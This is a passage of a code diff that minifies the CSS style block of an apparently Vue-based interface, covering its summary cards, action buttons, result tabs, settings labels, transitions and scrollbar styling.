-/* ── Summary cards ───────────────────────────────────────── */
 .summary-card {
     padding: 20px 24px;
     display: flex;
     flex-direction: column;
-    gap: 6px;
+    gap: 6px
 }
 
 .summary-label {
@@ -1036,8 +1015,8 @@ function saveSettings() { showConfig.value = false }
     gap: 6px;
     font-size: 10px;
     font-weight: 700;
-    letter-spacing: 0.12em;
-    text-transform: uppercase;
+    letter-spacing: .12em;
+    text-transform: uppercase
 }
 
 .dot {
@@ -1045,10 +1024,9 @@ function saveSettings() { showConfig.value = false }
     width: 6px;
     height: 6px;
     border-radius: 50%;
-    flex-shrink: 0;
+    flex-shrink: 0
 }
 
-/* ── Action buttons ──────────────────────────────────────── */
 .action-btn {
     display: inline-flex;
     align-items: center;
@@ -1058,72 +1036,70 @@ function saveSettings() { showConfig.value = false }
     font-size: 12px;
     font-weight: 700;
     border: 1px solid transparent;
-    transition: all 0.15s;
+    transition: all .15s;
     cursor: pointer;
-    color: white;
+    color: white
 }
 
 .action-btn:disabled {
-    opacity: 0.3;
+    opacity: .3;
     cursor: not-allowed;
-    pointer-events: none;
+    pointer-events: none
 }
 
 .action-btn--run {
-    background: rgba(59, 130, 246, 0.12);
-    border-color: rgba(59, 130, 246, 0.3);
+    background: rgba(59, 130, 246, .12);
+    border-color: rgba(59, 130, 246, .3)
 }
 
 .action-btn--run:hover {
-    background: rgba(59, 130, 246, 0.2);
-    transform: translateY(-1px);
+    background: rgba(59, 130, 246, .2);
+    transform: translateY(-1px)
 }
 
 .action-btn--stop {
-    background: rgba(239, 68, 68, 0.08);
-    border-color: rgba(239, 68, 68, 0.2);
-    color: #f87171;
+    background: rgba(239, 68, 68, .08);
+    border-color: rgba(239, 68, 68, .2);
+    color: #f87171
 }
 
 .action-btn--stop:hover {
-    background: rgba(239, 68, 68, 0.14);
+    background: rgba(239, 68, 68, .14)
 }
 
 .action-btn--muted {
-    background: rgba(255, 255, 255, 0.03);
-    border-color: rgba(255, 255, 255, 0.07);
-    color: rgba(255, 255, 255, 0.4);
+    background: rgba(255, 255, 255, .03);
+    border-color: rgba(255, 255, 255, .07);
+    color: rgba(255, 255, 255, .4)
 }
 
 .action-btn--muted:hover {
-    background: rgba(255, 255, 255, 0.06);
-    color: white;
+    background: rgba(255, 255, 255, .06);
+    color: white
 }
 
-/* ── Result tabs ─────────────────────────────────────────── */
 .result-tab {
     display: inline-flex;
     align-items: center;
     gap: 6px;
-    padding: 10px 16px 10px;
+    padding: 10px 16px;
     font-size: 11px;
     font-weight: 700;
-    letter-spacing: 0.08em;
+    letter-spacing: .08em;
     border-bottom: 2px solid transparent;
     margin-bottom: -1px;
-    transition: all 0.15s;
+    transition: all .15s;
     cursor: pointer;
-    background: transparent;
+    background: transparent
 }
 
 .tab-badge {
     padding: 1px 6px;
     border-radius: 4px;
     font-size: 10px;
-    font-weight: 700;
+    font-weight: 700
 }
 
-/* ── Results action buttons ──────────────────────────────── */
 .results-action-btn {
     display: inline-flex;
     align-items: center;
@@ -1132,35 +1108,34 @@ function saveSettings() { showConfig.value = false }
     border-radius: 8px;
     font-size: 11px;
     font-weight: 600;
-    color: rgba(255, 255, 255, 0.3);
-    border: 1px solid rgba(255, 255, 255, 0.06);
-    transition: all 0.15s;
+    color: rgba(255, 255, 255, .3);
+    border: 1px solid rgba(255, 255, 255, .06);
+    transition: all .15s;
     cursor: pointer;
-    background: transparent;
+    background: transparent
 }
 
 .results-action-btn:hover {
     color: white;
-    background: rgba(255, 255, 255, 0.05);
-    border-color: rgba(255, 255, 255, 0.12);
+    background: rgba(255, 255, 255, .05);
+    border-color: rgba(255, 255, 255, .12)
 }
 
 .results-action-btn--danger:hover {
     color: #f87171;
-    background: rgba(239, 68, 68, 0.06);
-    border-color: rgba(239, 68, 68, 0.15);
+    background: rgba(239, 68, 68, .06);
+    border-color: rgba(239, 68, 68, .15)
 }
 
-/* ── Settings ────────────────────────────────────────────── */
 .settings-section-label {
     display: inline-flex;
     align-items: center;
     gap: 6px;
     font-size: 10px;
     font-weight: 700;
-    letter-spacing: 0.12em;
+    letter-spacing: .12em;
     text-transform: uppercase;
-    color: rgba(255, 255, 255, 0.25);
+    color: rgba(255, 255, 255, .25)
 }
 
 .gateway-tag {
@@ -1169,57 +1144,55 @@ function saveSettings() { showConfig.value = false }
     border-radius: 5px;
     font-size: 10px;
     font-weight: 600;
-    color: rgba(96, 165, 250, 0.7);
-    background: rgba(59, 130, 246, 0.08);
-    border: 1px solid rgba(59, 130, 246, 0.15);
+    color: rgba(96, 165, 250, .7);
+    background: rgba(59, 130, 246, .08);
+    border: 1px solid rgba(59, 130, 246, .15)
 }
 
-/* ── Transitions ─────────────────────────────────────────── */
 .fade-slide-enter-active,
 .fade-slide-leave-active {
-    transition: all 0.22s cubic-bezier(.4, 0, .2, 1);
+    transition: all .22s cubic-bezier(.4, 0, .2, 1)
 }
 
 .fade-slide-enter-from,
 .fade-slide-leave-to {
     opacity: 0;
-    transform: translateY(8px);
+    transform: translateY(8px)
 }
 
 .modal-fade-enter-active,
 .modal-fade-leave-active {
-    transition: opacity .2s ease;
+    transition: opacity .2s ease
 }
 
 .modal-fade-enter-from,
 .modal-fade-leave-to {
-    opacity: 0;
+    opacity: 0
 }
 
 .modal-zoom-enter-active,
 .modal-zoom-leave-active {
-    transition: all .25s cubic-bezier(.4, 2, .6, 1);
+    transition: all .25s cubic-bezier(.4, 2, .6, 1)
 }
 
 .modal-zoom-enter-from,
 .modal-zoom-leave-to {
     opacity: 0;
-    transform: scale(0.94) translateY(6px);
+    transform: scale(.94) translateY(6px)
 }
 
-/* ── Scrollbar ───────────────────────────────────────────── */
 html {
     scrollbar-width: thin;
-    scrollbar-color: #1a1a1a #000;
+    scrollbar-color: #1a1a1a #000
 }
 
 ::-webkit-scrollbar {
     width: 4px;
-    background: #000;
+    background: #000
 }
 
 ::-webkit-scrollbar-thumb {
     background: #1e1e1e;
-    border-radius: 99px;
+    border-radius: 99px
 }
 </style>
